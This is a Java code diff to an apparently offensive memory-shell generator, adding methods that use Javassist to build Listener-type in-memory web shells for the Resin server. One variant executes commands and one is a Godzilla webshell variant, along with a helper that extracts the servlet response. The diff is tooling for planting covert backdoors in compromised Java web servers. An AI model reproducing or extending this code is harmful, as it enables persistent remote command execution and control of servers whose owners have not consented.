@@ -163,6 +163,53 @@ public class MSJavaClassBuilder {
                 "return getFieldValue(channel, \"_response\");}");
     }
 
+    /**
+     * Resin
+     */
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] resinListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        resinListenerResponseMaker(ctClass);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Godzilla)
+    public byte[] resinListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        resinListenerResponseMaker(ctClass);
+
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
+    public void resinListenerResponseMaker(CtClass ctClass) throws Exception{
+        // response
+        CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
+        responseCtMethod.setBody("{\n" +
+                "return getFieldValue($1, \"_response\");}");
+    }
+
 
     public static byte[] defaultOriginalMS(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
